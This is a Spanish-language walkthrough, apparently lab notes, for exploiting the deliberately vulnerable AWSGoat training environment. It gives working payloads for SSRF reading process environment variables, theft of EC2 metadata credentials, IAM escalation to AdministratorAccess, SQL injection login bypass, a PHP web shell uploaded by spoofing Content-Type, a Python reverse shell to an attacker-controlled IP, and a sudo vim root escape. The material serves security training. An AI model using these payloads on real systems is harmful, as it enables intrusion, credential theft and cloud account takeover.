### SSRF
1. Una vez siendo un usuario admin seguramente tenemos acceso sin restricciones al resto del entorno así que podemos seguir explorando. En la sección de "Newpost" veremos algo interesante y es que tenemos la posibilidad de poder subir un archivo además de que nos indica que también podemos colocar una URL para dicha imagen, estos puntos llaman la atención ya que si están mal configurados nos podemos aprovechar de ello y obtener algún tipo de información o acceso del entorno.
![[AWSGoat29.png]]
2. Lo primero que podríamos pensar seria en usar algún tipo de revershell como normalmente se suele usar pero debemos de tener en cuenta que este entorno se encuentra en la nube por ende cosas como PHP no se usan en si, lo que haría que no fuera fructífero en intento de reverhsell por ende nuestro punto de ataque será el área donde se coloca la URL para una imagen. Lo que se va a trabajar es un SSRF (Server-Side Request Forgery), podemos intentar con recursos http pero lo que nos interesa en este caso es obtener información del entorno por ello el payload que haremos será **`file:///proc/self/environ`**, en esta se encuentra la información que buscamos en local ya que **`"/proc/self" apunta al proceso actual`** y **`"environ" contiene las variables de entorno de ese proceso`**. Recordemos que debemos de usar Burp Suite para poder capturar esta solicitud.
![[AWSGoat30.png]]
3. Cuando realizamos la petición como tal el entorno en el que nos encontramos no habrá cambiado mucho pero en Burp Suite será diferente ya que al momento de mandar la solicitud veremos que la respuesta nos manda en el body un link, un link el cual pertenece a un S3, dicho link indica que en el S3 se almacena imágenes que la petición que acabamos de hacer se a guardado como una imagen a pesar de que el contenido que indicamos no lo fuera. 
![[AWSGoat31.png]]

### IAM Privilege Escalation
1. Vale, una vez que estamos con la conexión ssh pues nos tocaría explorar el entorno. Lo que podemos observar es que es una instancia de **Amazon Linux** y poco mas a simple vista, si se realizan comando para ver información sobre el entorno no daremos con mucho exceptuando por el archivo en donde se tiene la llave ssh con la que nosotros pudimos conectarnos. Una vez que vemos que hay nada hay que cambiar el concepto ya que si sabemos que estamos en un entorno en la nube también podemos buscar cosas basado en ello como un rol del IAM que este asociado a la instancia. El comando para ello seria **`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`**, se coloca esa dirección IP y ruta ya que **es la dirección IP y ruta del servicio de metadata interno de AWS**. Solo es accesible desde dentro de la instancia EC2 y no responde desde internet debido a que AWS lo usa para que las instancias puedan consultar información sobre sí mismas sin necesidad de credenciales preconfiguradas. Una vez hecho esto nos debió de haber devuelvo un rol el cual ahora vamos a usar para realizar la misma consulta pero con el nombre del rol en la parte final, el comando es **`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[NOMBRE_DEL_ROL]`** y esto nos brindara **un JSON con las credenciales temporales del rol**.
![[AWSGoat42.png]]
2. Lo siguiente seria identificar nuestra identidad para ver si todo lo que se realizo esta correcto. Para ello haremos **`aws sts get-caller-identity`** que confirma que las credenciales funcionan y qué rol se esta usando, luego haremos **`aws iam list-attached-role-policies --role-name AWS_GOAT_ROLE`** que muestra qué puede hacerse con ese rol.
![[AWSGoat43.png]]
3. Bien, podemos ver que el rol presenta 2 políticas, la que mas nos interesa es la segunda que dice **`/dev-ec2-lambda-policies`** entonces debemos de saber que permite dicha política en especifico. Para ello primero tenemos que ver la información de la política con el comando **`aws iam get-policy --policy-arn arn:aws:iam::859977947125:policy/dev-ec2-lambda-policies`**, entre los datos que vemos el que nos interesa es el de la versión (mencionar que se puede cambiar el **`get-policy`** por **`list-policy-versions`** para obtener mas directa la información) ya que con ello podremos visualizar mas información con respecto a la política con el comando **`aws iam get-policy-version --policy-arn arn:aws:iam::859977947125:policy/dev-ec2-lambda-policies --version-id v1`** lo que nos dará como resultado que el rol en el que estamos puede intervenir en el rol anterior que habíamos conseguido (esto se indica en el **Resource** del **Pol0**)
![[AWSGoat44.png]]
![[AWSGoat45.png]]
4. Quizas es complejo de entender a simple vista pero básicamente con el rol actual que tenemos (**AWS_GOAT_ROLE**) tenemos poder sobre el anterior rol que encontramos (**/blog_app_lambda_data**) y por ello podemos realizar la accion de agregarle un nuevo permiso a ese rol (una nueva role-policy). El permiso que vamos a buscar agregar es **/AdministratorAccess** el cual le dará permisos de administrador a el rol. Esto se hará con el comando **`aws iam attach-role-policy --role-name blog_app_lambda_data --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`** pero antes y despues de hacer este comando podemos realizar **`aws iam list-attached-role-policies --role-name blog_app_lambda_data`** para comprobar el cambio.
![[AWSGoat46.png]]
5. Una vez que hacemos este cambio solo debemos de volver a acceder a el usuario anterior pero en caso tal de que no podamos lo mas probable es que sea porque las credenciales están vencidas y solamente debemos de hacer lo que hicimos en la vulnerabilidad anterior y ya volveremos a estar en el entorno. Un detalle que note es que en la vulnerabilidad anterior se mostraban los datos que queríamos en un archivo .png pero ahora por un motivo los archivos se mostraban de manera directa, asumo que es un efecto de haber agregado los permisos de administrador.
![[AWSGoat47.png]]
6. Ya una vez tenemos los valores que requerimos, colocamos las credenciales para volver a acceder a el entorno, confirmamos que somos quien deseamos ser (blog_app_lambda_data) y pasamos a realizar cualquier comando que anteriormente nos hubiera dado error. Con ello ya se habría comprobado que mediante malas configuraciones en el IAM logramos escalar privilegios en un usuario que ya existía en el equipo haciendo que tenga mas privilegios.

### SQL Injection
1. Una vez que tenemos el entorno levantado, accedemos a el link que nos da y procedemos a inspeccionar. Lo que tenemos es una pagina de inicio de sesión, hay muchas cosas que podemos probar pero la que nos interesa en este caso es hacer un SQL Injection en dicho panel de inicio de sesión.
![[AWSGoat50.png]]
2. Podemos tomar 2 caminos para aprovecharnos de la vulnerabilidad. La primera es desde la misma web en donde debemos de probar diferentes métodos de SQL Injection, al hacerlo veremos que la mayoría (por no decir que todos) nos indica un mensaje (se aprecia mejor desde Chrome) donde en resumidas cuentas debemos de colocar un signo **@** ya que se supone que estamos colocando una dirección de correo electrónico pero no estamos haciendo eso así que la manera de burlar esto es dando click izquierdo a la pagina y presionar la opción de "**Inspeccionar**", ahí buscaremos la linea encargada de validar que sea un correo lo que estamos ingresando, se debería de ver así **`<input type="email" placeholder="Email" name="email" value="" required="">`**, y debemos de cambiar el valor **`type="email"`** por **`type"text"`**, le damos Enter y ahora solo quedaría volver a colocar el SQL Injection que en este caso es **`' OR 1=1 #`**, le damos a el botón de login y deberíamos de poder pasar la pestaña de inicio de sesión sin problema.
![[AWSGoat51.png]]
3. Ahora, la otra manera es desde Burp Suite. Primero debemos de capturar la petición y mandarla al Repeater, una vez que esta ahí debemos de procurar tener el mismo payload de SQL Injection anterior en el cuerpo de la petición. Una vez que la tenemos todo listo, mandamos la petición y veremos que nos devuelve un código **302** que es pocas palabras significa una redirección, o sea que nos va a mandar a una pagina diferente, dicha pagina diferente es la que nos interesa ya que si vemos también en la respuesta nos dice a donde va dirigida ese redirección. Lo siguiente puede variar dependiendo de como se tenga el Burp Suite ya que a algunos luego de mandar esta petición les saldrá la opción de si desean seguir la redireccion lo que facilita la obtención de la pagina pero a otros (como es este caso) no nos dirá eso así que lo que debemos de hacer es simplemente dar click izquierdo sobre la petición y buscar la opción "**Show response in browser**" la cual nos dara un URL que debemos de colocar en el navegador y listo, habremos llegado de la misma manera a la pagina principal del entorno.

### File Upload
1. Una vez que estamos dentro del entorno procederemos a buscar la opción de "**Reimbursements**" (la que no se entiende que dice) y veremos que hay 2 secciones, un que es "**Applies**" y otra que es "**Apply**", la que nos interesa es la de segunda. Estando ahí veremos que el entorno nos permite subir un archivo, lo que ya nos da un indicio de que posiblemente sea una ruta para atacar. Una vez que lo tenemos claro debemos de crear una reverse shell de php (podemos saber que se usa php ya que en la URL la extensión lo indica o usando Wappalyzer), guardamos el archivo que creamos con ello y ahora pasamos a subirlo pero si lo hacemos de forma directa nos dará error por que nos indica que ese tipo de archivos no se soportan. Lo sensato seria cambiar la extensión o quizás hasta cambiar valores hexadecimales pero la respuesta esta en usar Burp Suite para capturar la petición y poder cambiar un valor en el body de donde se envía la reverse shell.
![[AWSGoat54.png]]
2. Una vez que tenemos capturada la petición debemos de tener en cuenta una cosa y es que cuando nosotros hacemos este mismo proceso pero con un .pdf la accion se completa sin problemas, pero si lo hacemos con un .php no. Sabiendo eso podemos buscar información relacionada en la petición. De entre todo lo que uno se puede encontrar lo que nos importa es la que dice **`Content-Type: application/x-php`**, si la comparamos con la que se envía cuando subimos un .pdf seria **`Content-Type: application/pdf`**, este cambio es el que nos interesa ya que se sobre entiende que cada uno indica el tipo de archivo que se esta enviando por ende quiere decir que si lo cambiamos podríamos obtener un mejor resultado llegando a obtener la reverse shell. Mandamos la solicitud cambiando el valor de **`x-php`** a **`pdf`** en la petición donde subimos el .php y la mandamos.
![[AWSGoat55.png]]
3. Vemos que al ser enviado nos da de nuevo un 302, lo que quiere que nos redirigió a otra dirección, o sea que podemos hacer lo mismo de buscar la opción de "**Show response in browser**", copiar la URL que nos da y colocar en un navegador para ver el resultado de lo que mandamos (o podemos cargar la pagina donde estamos) pero daremos con un problema y es que si intentamos usar la reverse shell de PentestMonkey no terminara de generar d conexión, por ende debemos de cambiar el contenido del archivo por algo mas simple como **`</php system($_GET["cmd"]);?>`**, realizamos lo que se menciono anteriormente y si todo se hizo de forma correcta veremos que el documento esta subido en el entorno.
![[AWSGoat56.png]]
4. Si ahora le damos click a el botón "**View File**" veremos que nos carga el "archivo" pero nos termina dando un error pero eso no importa, lo que debemos hacer es seleccionar la URL y dirigirnos a el final del todo y solamente debemos de colocar el comando que deseamos realizar con el formato **`?cmd=[comando]`** y con ello ya podremos ahora si establecer una conexión, en este caso use python3 para ello (cabe recalcar que teniendo ya este así se puede trabajar pero es tedioso y que debemos de tener un equipo con IP publica para poder realizar dicha conexión) con el comando **`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP.PUB.DEL.EQU",PUERTO));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`**, recordar que antes de se debe hacer el comando **`nc lnvp PUERTO`** para poder estar en escucha y recibir la conexión. Si todo se hizo de forma correcta, ya habremos recibido la conexión del equipo.

### Misconfigured sudo / local privilege escalation
1. Una vez que ya tenemos la shell (y de haberla sanitizado) debemos de pasar a ver datos que nos ayude a entender el entorno en el que nos encontramos. Por ejemplo si hacemos **`whoami`** veremos que somos **`www-data`** lo que es esperable ya que accedimos desde la web. Si hacemos **`hostname`** veremos que nos una secuencia de caracteres, dicha secuencia de caracteres tiende a estar relacionada con contenedores por ende quiere decir que muy probablemente estemos en un contenedor. Lo otro es que al hacer el comando **`sudo -l`** veremos que permisos tiene el usuario en el entorno, al hacerlo veremos que el usuario presenta el permiso **`(root) NOPASSWD: /usr/bin/vim /var/www/html/documents`** lo que indica que usando el comando de **`vim`** (pero con la ruta completa como se indica) puede editar la ruta indicada que es **`/var/www/html/documents`**. Lo importante de esto ultimo es que dicha ruta esta bajo el usuario **`root`** por ende nos podemos aprovechar de ello para generar una tty con permisos de **`root`** lo que nos dará mayor acceso a el entorno.
![[AWSGoat60.png]]
2. Bien, para hacer esto debemos de hacer el comando tal cual como se indicaba en el paso anterior, el comando seria **`sudo /usr/bin/vim /var/www/html/documents`**, una vez dentro nos saldrá el entorno del vim, lo único que debemos de hacer es escribir **`:!/bin/bash`** y con ello ya habremos entrado como usuario root en el entorno que nos encontramos.
